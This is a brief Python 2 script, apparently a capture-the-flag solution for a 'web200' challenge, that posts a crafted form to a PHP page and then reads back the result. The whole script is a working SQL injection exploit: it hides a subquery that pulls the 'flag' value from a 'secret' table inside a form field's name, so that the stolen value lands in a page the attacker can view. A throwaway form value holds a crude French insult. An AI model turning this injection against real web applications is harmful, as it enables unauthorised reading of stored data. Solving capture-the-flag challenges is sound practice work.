import urllib
URL = "http://misteryou.ru/web200/index.php"
URL_ADD = "http://misteryou.ru/web200/index.php?mode=add"
 
sql_injection = '), ((SELECT flag FROM secret LIMIT 1), '
 
params = urllib.urlencode({
    'location': "osef suce.",
    'fields[%s]' % sql_injection: "false"
})
 
print urllib.urlopen(URL_ADD, params).read()
print "-" * 80
print urllib.urlopen(URL).read()
